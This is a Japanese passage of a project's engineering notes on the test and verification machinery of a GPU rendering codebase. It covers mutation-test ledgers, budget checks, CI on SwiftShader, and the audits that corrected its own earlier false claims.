| 格子 | 費用 | 最悪（1500F・`d=2.25`） | 育った点 |
|---|---|---|---|
| HIGH 89,304 | 14.24s | ×1.082658 | 下側 1・上側 4 |
| **軽 20,000**（`framing.test.ts` と同じ） | **3.25s** | **×1.082529（差 0.012%）** | 下側 1・上側 4 |
| 軽 8,000 | 1.52s | ×1.080196（差 0.23%） | 下側 1・上側 4 |

結果 `npm test` は **12.28 / 10.64s**（1.8 倍）に収まった。

**規律ではなく事実として書く**: `npm test` に何かを足すときは、
**その秒数に 53 を掛けた数を CI の予算に足せるか**を先に見る。

### 7.9.2.2 台帳の `observed` が 22 / 53 にしか無かった（Phase 2c-vii で実測）

`teeth.mjs` は `failed < m.observed` で「前より弱った」を検出するが、
**`observed` を持たない 31 本では `failed < undefined` が常に false** になり、
**弱りの検出が構造的に効いていなかった。** 2c-vii で ~~全 53 本~~ **52 / 53 本**を実測値で埋めた。

#### **埋め残しが 1 本あった。しかもそれは 2c-vii 自身が足した歯だった**（Phase 2c-viii で実測）

`ホールドの単調性を外す` に `observed` が無い。**`observed` を 22/53 から補完した
その PR が、自分で新しく足した変異にだけ付け忘れていた** ── 補完の作業は
「既存の台帳を舐める」形で行われ、**同じ PR で追加した行はその舐めの外に在った**。
2c-viii で実測して埋めた（`observed: 1`）。機構でも塞いだ ──
**`observed` を持たない変異が 1 本でも在れば `teeth.mjs` は走る前に落ちる。**

なお独立監査は「`weaker` が `exitCode` を立てないのは欠陥だ」と報告し、2c-vii は
**この節の冒頭が意図として明記している**（「リファクタで正当に減ることもあるので
落とさずに出す」）ことを理由に**却下した**。制御フローの読みは正しく、意図の判定が外れていた。

#### **その却下は、Phase 2c-viii で覆した**（実演で決めた）

意図が書かれていることと、その意図が正しいことは別である。**代償を実測した:**

`survival.test.ts` の `CASES` から 2 枚目の標本を消す。その行に付いているコメントは
**「2c-iv の教訓: 標本を 1 枚しか通さない測定は『測った』と書けない」**である。

```
削除前: npm test 431 緑 / teeth『2c-iv』→ 4 件・噛んだ 1     EXIT=0
削除後: npm test 430 緑 / teeth『2c-iv』→ 3 件・弱った 1     EXIT=0  ← CI は緑
```

**記録された教訓そのものを撤回しても、7 点の品質ゲートが 1 つも赤くならない。**
警告は CI のログに 1 行出るだけだった。

→ `failed < observed` を**落ちる**ようにした。正当なリファクタの道は塞いでいない ──
**その PR の中で `observed` を下げる**（差分に出るので査読で見える）。
**「ログの 1 行」と「台帳の差分」の違いがこの変更の全部である。**

**そして 2c-vii は、自分が足した歯 1 本が既存の複製だったことに後から気づいた** ──
`包絡を門で入れるのをやめる` は `包絡から門を外す` と `file` / `find` / `replace` が
1 文字も違わず、**本数を 49 → 53 に見せかけるだけ**だった（`framingHold` の
単調性を外す別の歯へ差し替えた）。

#### **その理由文「台帳の本数はラチェットなので」は偽だった**（Phase 2c-viii で実測）

**ラチェットは存在しなかった。** 独立監査が repo を全走査し、期待本数のリテラルが
**0 件**であること、`teeth.mjs` は `targets.length` を `console.log` するだけであること、
**台帳から変異を削っても何も赤くならない**ことを確認した。

これは §7.10 の型 5 の変種で、**「出所が自分」ですらない ──
確かめずに書いた肯定形**である（§0.1 が禁じているのは否定形だが、
**肯定形でも「確かめずに書いた」ことは同じである**）。しかも、その一文は
「複製を入れてはいけない」という**正しい結論の理由として**書かれていた ──
**結論が正しいと、理由は検算されない。**

2c-viii で 2 つとも機構にした: `EXPECTED_MUTATIONS`（本数のラチェット）と、
**`file` / `find` / `replace` の 3 つ組が一致する変異を機械で止める複製検査**。
2c-vii が手で見つけた型は、いま機械が見る。

### 7.9.3 それでもまだ見張らないもの（Phase 2c-i 時点で更新）

- ~~**位相を流したまま HDR を測る行が無い。**~~ → **G16 を足した**（§4.20）。
  これが無かったせいで `MEASURED_PEAK_ENVELOPE` が「包絡」を名乗れていた。
  故障 `nosweep` が「位相 0 で測る」を検出する。
- **G16 の掃引は閉軌道の 30 秒ぶんでしかない。** 周期は 2000π ≈ 6283 秒なので **0.48%** である。
  つまり G16 の生の峰は**下限であって上限ではない**。
  上限を要求しない設計（§4.21）にしたのでこれで足りるが、
  「掃いたから上限だ」と読んではいけない。

- ~~**残差（因子 2）の大きさのモデル。**~~ → **決着した**（§4.6 訂正 5）。
  `blendProbe` が **fp16 の 0 方向切り捨て**を 6/6 の厳密一致で同定し、
  監査のシミュレーション（最近接・不偏）と実測（切り捨て・片側）の矛盾が解けた。
  副産物として §4.6 の予算表を作り直した（深度 512 の余裕は 1.364 ではなく **2.439**）。
- ~~**`d ≥ 3` の色を採点する行が 1 本も無い。**~~ → **G12 を足した**（実測 0.018〜0.021%）。
  ただし**重ね合わせは乗法的な欠損を見ない** ── 見ているのは非線形性だけである（§4.6）。
- **`d ≥ 3` の色に、絶対水準の予算が無い。** G12 は線形性しか問わない。
  絶対値を採点するには幾何のモデルが要り、それは `reconstructMean` / `fillRatios` と
  同じ型の危険がある。**予算を持てない量に予算を置かない**という §7.2 の規律のほうを取った。
- **`blendProbe` は 1 ラスタライザでしか投票していない。** 切り捨ては ANGLE Metal /
  Apple M1 Max の実測であって、SwiftShader や他の GPU が同じとは言っていない
  （G14 は `--structural` に入れていないので CI では走らない）。
- ~~**CI には載っていない。**~~ → **載せた**（#18）。runner に Google Chrome 150.0.7871.128 が
  在ることを `gh api` で確認し、ローカルで SwiftShader を強制して先に通したうえで足した。
  そして `glInfo()` が答えを出した ──
  `ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero)), SwiftShader driver)`。
  **CI に ΔE00 は置かない**（実測: `d = 0` の峰が SwiftShader **133** / ANGLE Metal **129**、
  ΔE00 3.18 / 4.70 ── 予算 3.5 なら「ソフトウェアは緑・出荷経路は赤」が作れる）。
- **ただし CI の初回実行が、こちらの想定を壊した**（下記 7.9.4）。
- **1 ラスタライザ・1 機体でしか走っていない。** Safari と Brave は在って未測定。
- **`--teeth` の故障一覧は 12 件**（2c-i で 1 件足した）。台帳なので、まだ増やせる。
- **前縮みそのものは、まだ誰も見張っていない。** 2c-ii が直したのは「構図が経過時間の
  関数だったこと」であって、**図が狭い位相で `fill.x` 0.03 まで前縮みすること自体は残っている**
  （2c-i が実測した §4.20 の機構）。ラダーの G11a は**上**限しか見ないので、
  `fill.x` の下限を採点する行は 1 本も無い。
- ~~**包絡が配線から外れていないことは、歯が見張っている。**~~ → **不十分だった**（Phase 2c-iv）。
  2c-ii の歯は「配線を外す」変異しか持たず、**「配線が生き続けるか」を見る歯が無かった** ──
  実際 `layout()` を 1 回通ると包絡が消えて二度と戻らなかった（§4.22 訂正 3）。
  歯を 1 本足した。**「配線されている」と「配線が生き続ける」は別の主張である。**
- **候補選抜（`ENVELOPE_CANDIDATES = 32`）は標本 No.0 でしか足りない**（Phase 2c-iv で実測）。
  横長・1 行画像で `need` が最大 **8.9% 不足**し、K を上げても 8192（現行の 202 倍）まで直らない。
  **これを見張る行も歯も無い** ── ラダーは標本 No.0 しか通さないので、
  No.0 で足りているかぎり永久に緑である。順位づけの規則を見直す別フェーズの仕事。
- **`envelopeFor` の「隣接スロットの max」は単調性の仮定で、単調ではない**（Phase 2c-iv）。
  厳密値を下回る点が 46/1001（最悪 4.49%）。`needDistance` 換算では `aX`/`aY` 側の余裕に
  相殺されて表に出ないが、**それは偶然であって、`zHi` は「点がカメラを越えないこと」を担う量**である。
- **`d ≤ 1` の包絡は、描いていないバッファ（格子）から計算されている**（Phase 2c-iv）。
  描くのは列平均線である。実測では足りているが、構成上の保証は無い。
- **`n ≤ 512` を破る帯が在り、直っていない**（Phase 2c-v・§4.6.1）。行は予算ではなく
  **記録値との一致**を見るので、悪化しても直っても赤くなる ── が、**絵は壊れたままである**。
  出荷経路からは到達不能なので利用者には起きないが、**Phase 3 が連続なつまみを付けた瞬間に起きる**。
- **G10 の記録値は HIGH でしか観測していない。** BALANCED の 628 / ULTRA の 1260 は
  閉形式 `4 × rows` からの計算で、BALANCED は 4 コア偽装で 1 度 GPU 実測したが、
  **G10 は `--structural` に入っていないので CI では採点されない** ── ULTRA は未観測のままである。
- **予算リテラルが `scripts/` に在るかぎり `npm run teeth` は構造的に守れない。**
  `g12budget` で G12 だけは塞いだが、ラダーの他の予算（ΔE00 の各行・`G11a` の 1.00 など）は
  **どれも「その数字を緩めたら赤くなるか」を確かめていない**。G12 と同じ空白がそこにある。
- **GPU に数えさせる器具はラダーに入っていない。** 深度の実測（`shaderSource` を包んで
  最終行を差し替える）は 2c-v の測定でだけ使った使い捨てで、行にはなっていない。
  だから G10 はいまも**モデルを採点している**（`x/x`）── 記録値が GPU 実測に裏打ちされている
  ぶんだけマシ、という状態である。
- ~~**ティアを固定する口が無い。** そのため CI では格子に依存する 6 行が採点できない。~~
  → **偽だった**（Phase 2c-iii）。必要だったのは口ではなく**ティアごとの期待値表**である。
  `anchors.test.ts` は 1c から全ティアを計算できる形だったのに、誰も `TIER_BUDGET.HIGH` を
  差し替えてみなかった ── **§0.1 規律 8（「できない」と書く前に確かめる）の再発**である。
  CI は **18 行 / 通過 18 / 採点しない 0** になった。
- **ティア別の表は、それ自体が新しい `x/x` を作る。** 表を増やすと「どの表を使うか」の判断が
  採点対象の外へ出る ── `bootTier()` が壊れて別のティアを返しても、ラダーはその表を選んで
  緑のままになりうる。独立監査がここを突いたので、`bootTier()` の**入力**から
  期待ティアを独立に出す行を足した（規則はラダー側へ手で写す。`quality.ts` は import しない）。
- **ティアの `dpr` / `samples` は配線されていない**（下記）。
- **ULTRA のアンカーは node の予測であって未観測**である。BALANCED は CI が、
  HIGH はローカルが実測しているが、ULTRA を出す機体がまだ無い。
- **Safari / Brave は未測定のまま。** playwright は本物の Safari を駆動できない
  （同梱の WebKit は別物）ので、第 2 のハーネスではなく **1c と同じ手動 1 回**で取る（Phase 2c）。

### 7.9.4 CI の初回実行が壊した想定 —— **アンカーは機体依存だった**（Phase 2a・#18）

「アンカーは CPU で決まるからラスタライザに依らない」は真である。
**しかし「機体に依らない」とは言っていなかった** ── そしてそう扱っていた。

runner は 4 コアなので `bootTier()`（`hardwareConcurrency` / `deviceMemory` / DPR を読む）が
**BALANCED** を返し、格子が **251×157**、`s0` が **3.3851792828685254** になる。
**1 機体でしか測っていなかったので、1a-iii から誰も気づいていなかった。**

→ ラダーに **`➖`（採点しない）という第 3 の状態**を入れた。ティアが違う行を緑にすると
**飛ばした行が通過として読まれる** ── この文書がいちばん嫌う形である。
CI の実測: **16 行 / 通過 10 / 失敗 0 / 採点しない 6**。

そしてこの実行が、§2.3 の「アンカーが構造で守られる」が**偽**であることを暴いた
（`sampleWeight` が BALANCED で 0.9999999999999996）。**直した**（§2.3）。
**欠陥をあぶり出した機体で直りを確かめている** ── CI（BALANCED / SwiftShader）で
`sampleWeight` が厳密に 1 になった。

---

### 7.10 偽の主張を規律ではなく機構で止める（Phase 2c-vi）

**この作品はここまでに偽の主張を 19 件落としている。** そのたびに §0.1 へ規律を足してきて、
いま 9 つある。**それでも出る。** しかも直近では、規律を書いたその同じ PR の中で同じ型を踏んだ ──
2c-iv は §8 に「標本を 1 枚しか通さない測定は『測った』と書く前に標本を増やす」と書きながら、
同じ PR で「門が全開なら後退は厳密にゼロ」を **`dimLevel` を偏って採って**書いた（§4.22 訂正 4）。

→ **規律を足すのをやめる。** 19 件を型に分け、**型ごとに 1 つの機構**を置き、
**いまの本数を数えて固定する**。§7.9 が「歯の確認を規律から仕組みへ」を実行したのと同じ形である。

#### 19 件は 5 つの型に尽きる

| 型 | 件数 | 例 | 機構 | 状態 |
|---|---|---|---|---|
| **1. 予算に歯が無い** | 3 | G12 の 0.5%・`COMPRESS_KNEE`・`PEAK_MARGIN` | `npm run ladder:budgets` | ✅ 2c-vi |
| **2. 掃引が主張より狭い** | 6 | 位相 0 の HDR・`n ≤ 512`・候補 32・位相 4096・600 フレーム・G9 の 2 フェーズ | **軸を広げる**（`widen.test.ts`） | ✅ 2c-vii |
| **3. 標本が 1 枚** | 3 | 単調性・収束表・`sampleWeight` の厳密 1 | **標本の台帳**（`specimen.test.ts`） | ✅ 2c-vii |
| **4. 配線されているつもり** | 4 | `CompressPass`・光過敏・`setQuality`・`layout()` の包絡 | `survival.test.ts` | ✅ 2c-vi |
| ~~**5. 数字の出所が自分**~~ → **前提が省かれている** | 3 → **実測 15 件** | 収束表の `viewportAspect`・停止表の δ・ティア表の `spritePx` | ~~出所リント~~ → **doc 数の再現台帳**（`docLedger.test.ts`） | ✅ 2c-ix |

**機構にできないものも在る。** 3.1% の算術ミス（誤りが 2 つあって打ち消し合っていた・§4.6.1）と、
包絡が単調だという思い込み（§4.22）は、**機構の誤り**であって検証の穴ではない。
そこは独立監査でしか捕まらない ── ただし**依頼の書き方が効く**（下記 §8）。

#### 型 5 —— **「出所が自分」ではなく「前提が省かれている」**（Phase 2c-viii で覆った）

2c-vi はこの欄に「出所リント」と書いた。**実測で覆った。** 監査がリントを実装し、
**自分で関数を呼んで作った正解集合**（再現 19 / 食い違い 20）に当てた結果:

| 定義 | 赤にする行数 | 本当に壊れている 20 行のうち捕捉 |
|---|---|---|
| 数字を含む行 | 2,672 | 20/20（誤検出 18/19） |
| 太字数字 ＋ 同じ行に「実測」 | 128 | 1/20 |
| ＋ 行に出所の印が無い | **69** | **0/20** |
| ＋ 塊に出所の印が無い | **25** | **0/20** |

**締めると件数と一緒に捕捉率が 0 になる。** 出所の印（`§`・PR リンク・`npm run`・
呼べる識別子）は**壊れている数字の隣にも同じ密度で在る**からで、
テキストは「**出所がある**」と「**その出所で再現する**」を区別しない。
出所リントは新しい `x/x` になる。

**そして「49 件 / 44 行」には導出が無かった。** 監査が数え方を **210 通り**実装して
総当たりし、49 に当たる定義が 1 通り、44 に当たる定義が 1 通り、
**「49 のうち 44」という包含関係が成り立つ定義は 0 通り**（corpus も単位も違う）。
初出は PR #33 の本文で、**任意の目標値が偶然どれかの定義に当たる率は 44.5%** である。
**数を先に決めて機械を後から作るのは、2c-vi が「数えるのと見積もるのは違う」と
書いたことの逆をやることである。**

##### 型 5 の実体 —— **2c-viii が挙げた 3 例のうち 2 例は、私の書き方のほうが誤りだった**（Phase 2c-ix で実測）

**独立な線は 3 本ではなく 2 本である**（`viewportAspect` と `M = 1024`）。
2c-viii は監査の要約をそのまま書いて、**検算しなかった**。

- **✅ 真**: `framingEnvelope.ts` の 15 桁の 2 数（`1.95054454365150` 対 `1.95054459373394`）は
  **`M = 1024`** の値で、置かれているのは `ENVELOPE_PHASES = 4096` を論じる節である。
  監査 A が M を掃いて **15 桁とも一致**させた（M=4096 では `1.98803452087732` 対 `1.98803457986683`）
- **❌ 偽**: 「`layout()` を呼ぶかどうかで **×1.354 が ×1.677** に変わる」。
  **`layout()` は 1 ビットも効かない。** 効いているのは `viewportAspect` だけである
  （`layout()` は既定 1 以外のアスペクトを入れる唯一の口なので、相関しただけだった）:

| 変種（`d = 2.20` を 18,000F） | 1F 目 | 300 秒後 | 倍率 |
|---|---|---|---|
| `layout()` を一度も呼ばない（既定 `a = 1`） | **2.926651** | 3.961528 | **×1.353605** |
| **`layout(778×778)`（`a = 1`）** | **2.926651** | 3.961528 | **×1.353605** |
| `layout(988×778)`（`a = 1.2699`） | 2.361766 | 3.961528 | ×1.677358 |
| `layout(1600×900)`（`a = 1.7778`） | 2.187855 | 3.961528 | ×1.810690 |

1F 目も 300 秒後も `Object.is` で一致する。**動くのは 1F 目だけ**で、
300 秒後はアスペクトに依らず 3.961528（ホールドが `aY` 支配域で飽和する）。

- **⚠ 数が違う**: 「収束表は **`viewportAspect ≥ 1.27`** でしか再現しない」──
  向き（`lensScene` の既定 1 では再現しない）は真だが、**閾値は 1.27 ではない**。
  表が aspect に依らなくなるのは `viewportAspect ≥ aX/aY` のときで、その比は
  M=256 で 1.0760・M=4096 で 1.0045 しかない。二分探索で求めた最小値は **1.07594**。
  **1.27 は 988/778 という 1 つの実測環境の値であって、閾値ではなかった。**

```
doc の表:  256:6.3548  1024:6.6645  4096:6.8693  16384:6.8804  65536:6.8813
a=1.0000:  6.6926      6.7714      6.8912      6.9102      6.9115   → 最悪 d=3
a≥1.0760:  6.3548      6.6645      6.8693      6.8804      6.8813   → 最悪 d=1.25（5/5 厳密一致）
```

- **⚠ 型が違う**: 「`TIER_BUDGET` と描画点数の不一致」。**3 つの出所は一致している**
  （`TIER_BUDGET.ULTRA` = `kernel.bench.ts` = §4.3 = 489×326 = **159,414**、3/3）。
  食い違うのは**予算と、`fitGrid` が実際に描く点数**である ── 1024×640 では
  ULTRA **505×315 = 159,075** / HIGH **378×236 = 89,208**。高さ 1000 で幅を 1px 刻みに
  3,901 通り掃くと、**予算ぴったりになるのは 12 通りだけ**（ULTRA。アスペクトが
  489/326 のときだけ）。§4.3 の「ULTRA 159,414 点で 1.29 ms」は
  **出荷経路が一度も描かない格子についての A 水準の主張**である。
  （`quality.ts` の docstring は**予算**については真で、**描画点数**については偽。撤回しない）

→ **出所を注釈して回る機構は、この型を 1 件も捕まえない。**
機構は「数 →（関数, **引数**）」の台帳にする。**引数まで書かせるのが要点**である。

##### 型 5 の機構 —— **doc 数の再現台帳**（`src/tests/docLedger.test.ts`・Phase 2c-ix）

**単位は行でも数でもなく「表」。** `src/**/*.ts` のコメント内マークダウン表を機械が数える
（定義を 5 通り実装して 5/5 一致・独立監査は 15 通りで 12/15 一致）:

| corpus | 表数 |
|---|---|
| 実装 doc（`src/tests/` 以外） | **36** |
| `src/tests/`（2c-ix 以前） | **13** |
| 合計 | **49**（2c-ix が自分の解説で 2 表足して 51） |

**`src/tests/` を corpus に入れた。** 入れないと「自分の解説をテストに書けば
自分の被覆検査に載らない」── 2c-viii が踏んだ「補完がその PR の追加分を舐めなかった」の doc 版である。

**「GPU / ブラウザ依存の約 14 表」は導出が無い数だった。** 監査 A が数え方を 13 通り
実装して総当たりし、**13〜15 に入るのは 1 通りだけ**（他は 0/3/3/8/8/8/8/10/11/16/17/8）。
2c-viii が「49 件 / 44 行」で踏んだのと同じ形である ── **数を先に決めて機械を後から作った。**
2c-ix は「反復軸を含むので載せない」を**除外表として書き下す**（44 件）ほうに替えた。

**4 つの規律**（独立監査が実演で決めた。どれも「これを外すと何が通るか」を実測してある）:

| 規律 | 外すと通るもの（実測） |
|---|---|
| 期待値を台帳に書かず **doc から機械が読む** | `expected: fn(args)` と書くと **doc を 999 に全置換しても緑** |
| `includes` を禁じ、**セルを位置で特定**する | 小数 2 桁の `includes` は **400/400 が「一致」** |
| 宣言した引数を**両側へ**揺らして表記桁超えを要求 | 飾りで書いた引数が **12 本中 6 本** |
| **`tol` は doc の表記桁**から機械が決める | 人が置くと、締めれば偽の赤・緩めれば包含照合 |

**揺らしは片側では足りない**（2c-ix で踏んだ）── `viewportAspect` を上げると
`fitDistance` の max が縦側へ移って飽和するので、**この repo の主題そのものが「飾り」と判定された。**

**7 表 87 セルを採点して、載っていた前提が 4 件出た**（どれも出所は健全な数）:

| 表 | 書かれていた前提 | 本当の引数 | 印字値で計算すると |
|---|---|---|---|
| `halfFloat` の停止表 | `δ = 9.537e−7` | **`2⁻²⁰`** | 5 行中 **2 行**が段の外（階段関数） |
| `halfFloat` の誤差表 | 「目標 0.21586」 | **`srgbToLinear(128/255)`** | 38 セル中 **5 セル**が外れる |
| `spriteGain` のティア表 | 「S = 8.6548 px」 | **`K_SPRITE · s0`** = 8.65403 | **6/6 セルとも**外れる |
| `framingEnvelope` の収束表 | 記載なし | **`viewportAspect = 988/778`** | **5 行とも**外れる |

**doc の側の誤りも 3 セル出た**（訂正済み）: 深度表 `n=64` の ΔE00 **0.260 → 0.259**、
収束比 **96.9% → 96.85%** と **99.83% → 99.82%**（doc は**丸めた `need` どうしを割っていた**）。

**再現しないことを記録した列も在る**: 深度表の**旧 ΔE00 列**は現在の export で出ない
（128 で 0.198・doc 0.324）。出所が失われている列なので、採点せずに数えた（型 3）。

###### **独立監査が、この機構に severe な穴を 2 つ見つけた**（実演つき・2c-ix の中で直した）

- **感度検査が 1 セルしか見ていなかった。** 初稿は各表につき「いちばん安いセル」を
  witness にしていた ── **92 セル中 85 セル（92.4%）の宣言引数は一度も揺らされない**。
  監査は witness でないセルに飾りの引数を 3 本足して 12/12 緑を実演した。→ **全セルを揺らす**（2.7 秒）
- **witness の選び方が判定を決めていた。** `framingEnvelope` の収束表で witness を
  `M = 256` から `M = 4096` へ変えると、**`viewportAspect` が「飾り」と判定される** ──
  `M ≥ 4096` では包絡の `aX/aY` が 1.0045 しかなく、`needDistance` の
  `max(aY/band, aX/aspect)` が縦側で決まるからである。
  → **出荷している `ENVELOPE_PHASES = 4096` を正当化している行では、
  台帳は `viewportAspect` の欠落を原理的に捕まえられない**（捕まえるのは `M = 256` の行だけ）。
  機構が捕まえないことを、機構の中に `inert` の理由として書き下した

**そして「比だから約分される」は偽だった**（機構が私を訂正した）── `needDistance` は
`max(aY/band, aX/aspect)/(fill·t) + zHi` で、**`zHi` の項は `fill` にも `fovDeg` にも
`bandFrac` にも掛からない**。完全に消えるのは `viewportAspect` だけである。
私は 5 引数を `inert` と書き、**`inert` 側の検証が 12 セルで赤にした**。
残差は行ごとに違う（`fovDeg`: `d=1.25` で 1.7e−2 / **`d=1.75` で 6.9e−4** / `d=3〜5` で 1.3e−2）──
**doc の桁が 1 つ増えれば「効く」側へ移る。** 私は「`d = 1.25` だ」と書き、機械が `d = 1.75` だと直した。

###### この機構が見張らないもの（正直に）

- **表記桁が粗い doc ほど緩い。** `**≈ 0%**` は 0 桁なので ±0.5 を通す。
  **桁を決めているのは著者**であって機械ではない（桁の総和にラチェットを置いたが、
  「落としたことが数として出る」だけで、落とせないわけではない）
- **全引数が `inert` のセルが 87 中 4 セル在る**。そこでは規律 3 が空回りしている
- **反復軸を含む表は載せていない。** 18000F / 36000F 系の 25 点を載せると
  `npm test` +464 秒 ＝ **teeth 換算 +6.96 時間**。**格子を落として安くする道は塞がっている** ──
  軽い格子（20,000 点）だと 1F 目が `2.919522` になり doc の `2.926651` を再現しない。
  **格子予算も load-bearing な引数**である
- **`SPEC.md` は corpus の外**である（単位が違う ── ここは主張の集積で、実装 doc は関数の隣にある数）

##### **§7.10 が挙げた型 5 の 3 例のうち、1 つは誤分類だった**

「実測 16/4/378」は型 5 ではない ── `modelledAdditionDepth` を呼べば
**16 / 4 / 378 が 3/3 とも厳密に出る**。壊れているのは数ではなく §0 の**水準表記**
（`A` ＝ 実測）で、これはモデルの出力である。**型の分類そのものが検算の対象**だった。

#### 型 4 —— 配線の生存の行列（`src/tests/survival.test.ts`）

**期待値を 1 つも書かない**のが要点である:

```
ある設定で観測 → 生存イベントを起こす → 同じ設定へ戻す → もう一度観測
```

問うのは「同じ設定に戻したのだから同じ値が出るはず」だけ。何がいくつになるべきかを書けば
採点者にモデルが入り、`fillRatios` / `reconstructMean` / G10 で繰り返し踏んだ `x/x` になる。

**2 標本 × 9 水準 × 10 イベント × 22 観測量 = 3,960 セル**を 3.4 秒で回す。
器具に歯が在ることを先に確かめた（2c-iv の変異を戻すと**戻らないセルが 0 → 92**、
`cameraDistance` / `fill` / `s0` / `spritePx` / `gain` / `sampleWeight` まで芋づるで検出する）。
**この器具が先に在れば、2c-ii のバグはその PR の中で捕まっていた。**

初回に 5 セルを検出した ── `linePoints` が、線を描いていないフレームで
**線バッファの最後の状態を漏らして**いた（キャッシュが観測面へ出ていた）。修正済み。

#### 型 1 —— 予算の歯を数える（`npm run ladder:budgets`）

**追加のブラウザ時間はゼロ。** `--teeth` 走行が捨てていた行を持つだけのレポータである。
予算 `site`（上限 `L`）に歯が在るのは、次を満たす故障が在るときに限る:

1. その故障で `site` の行が落ちる
2. **その id で落ちたのがその行だけ** ── `expect` は id 単位なので、
   同じ id の別行が同時に落ちると `L` を動かしても gate は色を変えない
3. 比が `1 < m ≤ 3` ── **桁で外す故障は予算を検証していない**（`colorfield` の m ≈ 500）

`gauge` が実際の判定式とずれたら**その場で例外**にした（全モードで毎回検査する）。
これが無いと検査が自分の書いた表を読み返すだけになる。

**実測: 歯の在る予算 6 / 19。歯の無い予算 13。**

| 判定 | 本数 | 内訳 |
|---|---|---|
| 歯が在る | **6** | `G1/marker` 1.43 / `G2b/errPct` 1.35 / `G8a/deltaE` 2.90 / `G12/dev` 1.57 / `G16/rawPeak` 1.20 / **`G9/deltaE` 1.06（余裕僅少）** |
| 覆う故障が無い | 7 | `G11a/maxFill` `G11b/minMargin` `G15/peakOff` `G16/wiredPeak` `G4/hueDeg` `G5/code` `G9z/deltaE` |
| 桁で外す | 3 | `G3/deltaE` 16.72 / `G4/wheelDeltaE` 10.41 / `G8b/deltaE` 4.46 |
| 同 id の別行と同時に落ちる | 3 | `G2a/deltaE` / `G15/peakWired` / `G8G9/rowSpread` |

**独立監査の静的な見積もりは 3 本だった。実測すると 6 本だった** ──
`viewport` と `nophase` が予告なく 3 本を守っていた。**数えるのと見積もるのは違う。**

#### 型 2 —— **「刻みを細かくする」は答えではなかった**（`src/tests/widen.test.ts`）

2c-vi はこの欄に `--density`（各掃引の刻みを 4 倍細かくする）と書いた。**実測で覆った。**

| 演算子 | `npm test` の費用 | 新しく赤になった主張 |
|---|---|---|
| 刻みを 4 倍細かく（`--density`） | 4.29s → **45.9s（10.7 倍）** | **0 本 / 19 本** |
| **1 点の軸を全域へ広げる（採用）** | 6.23s → **12.28s（1.8 倍）** | **3 本** |

理由は**上の表の型 2 の欄を数えれば分かる**。6 件のうち「位相 0 の HDR」はデータ表、
「候補 32」「位相 4096」「600 フレーム」「G9 の 2 フェーズ」は**反復回数**、
「`n ≤ 512`」は 2c-v で折れ点列挙へ置き換え済み ── **刻みの掃引は 1 件も無い。**
`--density` を実装していたら、**自分で名指しした 6 件のうち 0 件に当たっていた。**

この作品の穴は「歩幅が大きすぎた」ではなく「**1 歩しか歩いていなかった**」である。

**機構は 2 つ持つ。**

1. **国勢調査** ── `src/tests/*.ts` の `for` 行を機械が読み、量子化 / 切り詰め / 点集合 /
   完全列挙に仕分ける。**分類できない行が 1 本でも在れば赤**にする（黙って数えないのが
   `record(…, null)` の型）。実測 **標本掃引 93 / 全 249 本**。
   数え方を機械が持つことが要点である ── **人が数えると割れた**（私 88 / 監査 A 123 /
   監査 C 12）。定義が違うだけで誰も嘘をついていないが、**意見はフェーズをまたげない**
2. **軸を広げた実測** ── 1 点に固定された軸を全域へ広げ、見えるものを留める

**初回に 3 本の偽を捕まえた**（どれも「題は広いが掃引は 1 点」）:

| 主張 | 現行の掃引 | 広げた結果 |
|---|---|---|
| 包絡は実際に包絡している（**このファイルが自ら「本体」と書く主張**） | `d = 3` × 40 位相 = **1 セル** | 21 スロット × 100 位相で最悪 **100.124%** ── 超える |
| `layout()` を挟んでも 600F で 1 ビットも動かない | `d = 3` の 1 点 | 刻み 0.05 で **1/101 点**、0.005 で **14/1001 点**が動く |
| 傾斜帯の代償は ×1.354 | 18,000F（300 秒） | 36,000F で **×1.4035**。`d=2.375` の初動は **459 秒** |

そして**土台を 2 つ直さないと機構が意味を持たなかった**:

- `framing.test.ts` の「帯を割らない」が**恒真**だった（50 万点の乱数で最大 0.86000000）。
  ここを直さずに掃引を密にすれば、**「広げました」がそのまま新しい `x/x` になる**
- `compress.test.ts` の隣接差は**予算が刻みの関数**で、密度を上げると 4 倍緩む。
  閉形式 `sup|f'| = COMPRESS_MAX_STRENGTH × 1.5 / GATE_RAMP = 21.428571` へ書き換えた

#### 型 3 —— **「1 枚しかない」ではなく「複数枚あるように書かれていた」**（`src/tests/specimen.test.ts`）

`core/framingEnvelope.ts` は「1024×64 横長」「1024×1 1 行」「1024×640 色相スイープ」で
測ったとする表を 2 つ載せている。**その 3 標本は repo に 1 バイトも無かった。**
`image/fixture.ts` の export は `makeSpecimen0` / `makeMonochrome` / `makeGrayscaleRamp`
の 3 つだけで、過去の作業セッションでその場で作られた標本の**数字だけが残っていた。**

独立監査が同名の標本を作って測ると、単調性の反例は主張の 46/1001・−4.49% に対し
**4/1001・−0.971%**、候補選抜の `need` 比は 91.572% に対し **100.000%** だった。
**桁が違うのは監査が間違えたからではなく、別物を測ったからである。**

→ **標本が 1 枚しかないより一段悪い。反証の手段ごと失われている。**

機構は `SPECIMEN_LEDGER`（`image/fixture.ts`）に 6 枚を実装し、**台帳が実際に判別することを
要求する**（期待値は 1 つも書かない ── `survival.test.ts` と同じ規律）。台帳を 1 枚に戻すと
すべての比が厳密に 1 になって赤くなる。

**3 枚では歯が立たなかった。** repo に在った No.0 / gray / mono では `sampleWeight` が
**厳密同一**で、最強の判別でも `spread.zHi` の 392.92 倍。6 枚にして初めて
`spread.aY` **717.19 倍** / `zHi` **552.10 倍** / `fill.y` **521.61 倍**が出た。

**歯を置けない場所も記録した**: `d = 0` と `d = 2`（アンカー窓）では構図が全標本で
厳密に同一である ── 門が 0 で点群の重みが 0 なので、フレーミングが板だけで決まり、
板はアスペクトしか見ない。**ラダーが標本 1 枚で緑を保てているのはこれが理由である。**

#### 型 2・型 3 の機構自身の弱点（正直に）

- **「広げて動かなかった」は「十分」の証明ではない。** 広げたのは `d` 軸・位相軸・反復軸だけで、
  **ラダー（GPU）は依然として標本 1・ティア 1・viewport 1** である
  （独立監査の実測: 72 行中 **標本依存 44 行 / ティア依存 31 行 / viewport 依存 57 行**）
- **反復軸は飽和まで回していない。** 1500F で切った ── 飽和は 36,000F（`d=2.20` で ×1.4035）
- **`d` 刻み 0.05 は 14 点中 1 点しか拾えていない**（0.005 は 18.75 秒かかる）
- **`EXPECTED_SWEEPS` は人が数字を上げれば通る形**で、型 1 の再演になりうる
- **古い表の数字は復元できない。** 台帳の標本は同名だが**別物**である ──
  `framingEnvelope.ts` の 2 つの表は、台帳で測り直すまで出所を持たない（型 5・2c-viii）
